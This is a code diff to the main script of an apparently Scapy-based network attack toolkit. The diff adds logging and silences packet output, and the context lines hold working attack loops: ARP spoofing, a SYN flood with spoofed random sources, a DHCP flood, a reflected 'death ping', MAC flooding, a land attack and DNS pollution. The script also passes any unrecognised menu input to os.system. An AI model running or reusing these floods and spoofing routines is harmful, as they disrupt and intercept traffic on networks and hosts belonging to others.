@@ -20,21 +20,35 @@ except:
     import sys
     input("按回车退出")
     sys.exit(0)
-import random, sys, uuid, os#导入需要的自带模块
+import random, sys, uuid, os, logging#导入需要的自带模块
 import socket as sk
+
+print("[+]init the log system.")
+file = open('log.log','w')
+file.close()
+LOG_FORMAT = "%(asctime)s:%(levelname)s:%(message)s"
+logging.basicConfig(level=logging.DEBUG,format=LOG_FORMAT,filename='log.log')
+logging.info("log system init done.")
+print("[+]log system init...Done")
 
 chinses_mode = False
 argv = sys.argv
 for i in argv:
+    logging.info("read the argv.")
     if i == "--help" or i == "-h":
         print("python run.py [-G] [-z]")
         print("use -G run in GUI mode.")
         print("use -z run in chinese mode.")
         sys.exit(0)
     elif i == "-G":
+        logging.info("run in GUI mode.")
+        logging.info("stop record the log.")
         import GUI
     elif i == "-z":
         chinses_mode = True
+        logging.info("run in GUI mode.")
+    else:
+       logging.warning("can not deal with the argv " + str(i) + ".") 
 
 print("The program must be run in utf-8.")#不知道为什么总有人用其他编码导致中文出问题。
 print("必须以UTF-8编码运行程序")
@@ -67,7 +81,7 @@ print("+--------------------------------------------------------------+")
 print("|          bilibili:space.bilibili.com/385353604               |")
 print("+--------------------------------------------------------------+")
 
-print("loding plugins...")#TODO init
+print("loding plugins...")
 
 plugins_list = []
 plugins_dir = os.path.join(os.getcwd() + '/plugins')
@@ -76,7 +90,11 @@ sys.path.append(os.getcwd() + '/plugins')
 for (dirpath, dirnames, filenames) in os.walk(plugins_dir):
     for plugins_name in filenames:
         if os.path.splitext(plugins_name)[1] == '.py':
-            exec("import " + os.path.splitext(plugins_name)[0])
+            try:
+                exec("import " + os.path.splitext(plugins_name)[0])
+            except SyntaxError:
+                logging.error("can not import the plugins '" + str(os.path.splitext(plugins_name)[0]) + "'.")
+                continue
             print("import " + os.path.splitext(plugins_name)[0] + "...Done")
             plugins_list.append(os.path.splitext(plugins_name)[0])
 
@@ -90,8 +108,6 @@ for i in file:
 file.close()
 
 print("password list read...Done")
-
-user_list = ["root"]
 
 class ARP_poof():
     def ARP_poof_with_not_ARPping(self):#ARP欺骗不带ARPPing
@@ -191,7 +207,7 @@ class ARP_poof():
 
         while True:#攻击主循环
             try:
-                sendp(packet)
+                sendp(packet,verbose=False)
                 time.sleep(1)
             except KeyboardInterrupt:
                 break
@@ -209,7 +225,7 @@ class ARP_poof():
 
         while True:#攻击主循环
             try:
-                sendp(packet)
+                sendp(packet,verbose=False)
                 time.sleep(1)
             except KeyboardInterrupt:
                 break
@@ -224,10 +240,11 @@ def SYN_flood(): #SYN flood attack SYN洪水不用我说把
 
     while True:#攻击主循环
         try:#一个ctrl + c退出模块自己体会
-            send(IP(src=RandIP(),dst=target)/TCP(dport=int(port), flags="S"))#生成&发送攻击数据包
+            send(IP(src=RandIP(),dst=target)/TCP(dport=int(port), flags="S"),verbose=False)#生成&发送攻击数据包
         except KeyboardInterrupt:
             break
         except OSError:
+            logging.error("the tarrget IP is not confrom to the IP format.user input IP is '" + str(target) + "'.")
             if chinses_mode:
                 print("你输入的地址不符合IP格式。")
                 time.sleep(1)
@@ -264,7 +281,7 @@ def DHCP_flood():
     packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(options=[("message-type","discover"),"end"])
     while True:
         try:
-            srp(packet)
+            srp(packet,verbose=False)
             time.sleep(1)
         except KeyboardInterrupt:
             break
@@ -275,7 +292,7 @@ def death_ping():
     else:
         target = input("Enter the target like 127.0.0.1:")
     while True:
-        send(IP(src=target,dst=RandIP())/ICMP())
+        send(IP(src=target,dst=RandIP())/ICMP(),verbose=False)
 
 def scapy_sniff():
     file = open('iface.setting','r')
@@ -323,7 +340,7 @@ def macof():
         try:
             packet = Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
             time.sleep(0.01)
-            sendp(packet)
+            sendp(packet,verbose=False)
         except KeyboardInterrupt:
             break
 
@@ -393,12 +410,12 @@ def DNS_pollution():
 
 def land_attack():
     if chinses_mode:
-        target = input("请输入目标IP")
+        target = input("请输入目标IP:")
     else:
         target = input("Enter the target IP:")
     while True:
         try:
-            send(IP(src=target, dst=target) / TCP(sport=135, dport=135))
+            send(IP(src=target, dst=target)/TCP(sport=135, dport=135),verbose=False)
         except KeyboardInterrupt:
             break
         except OSError:
@@ -539,5 +556,8 @@ while True:#喜闻乐见的主循环
             os_command = False
 
     if os_command:#如果不是选项就当作系统命令
+        logging.info("user run the command " + str(choose) + ".")
         os.system(str(choose))
         time.sleep(2)
+    else:
+        logging.info("user choose the tool " + str(choose) + ".")
